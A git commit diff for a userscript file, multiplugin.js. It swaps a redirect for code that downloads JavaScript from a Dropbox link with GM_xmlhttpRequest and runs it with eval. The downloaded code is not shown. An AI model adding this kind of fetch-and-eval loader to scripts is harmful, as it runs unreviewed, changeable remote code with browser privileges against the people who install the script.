15b50c0ee0166e7707e290f9354078316da17b2e
flbird26 <94467132+flbird26@users.noreply.github.com>
2026-01-08 13:34:21 +0200

    Update multiplugin.js

--- multiplugin.js
+++ multiplugin.js
@@ -1,1 +1,9 @@
-location.href = 'https://dl.dropboxusercontent.com/scl/fi/w7ptfh525zesvinbqtxja/multiplugin.js?rlkey=1zozlazpsovf4sy96pdez6d23&st=544lfp8b';
+(function() {
+    GM_xmlhttpRequest({
+        method: "GET",
+        url: "https://dl.dropboxusercontent.com/scl/fi/w7ptfh525zesvinbqtxja/multiplugin.js?rlkey=1zozlazpsovf4sy96pdez6d23&st=544lfp8b",
+        onload: function(response) {
+            eval(response.responseText);
+        }
+    });
+})();
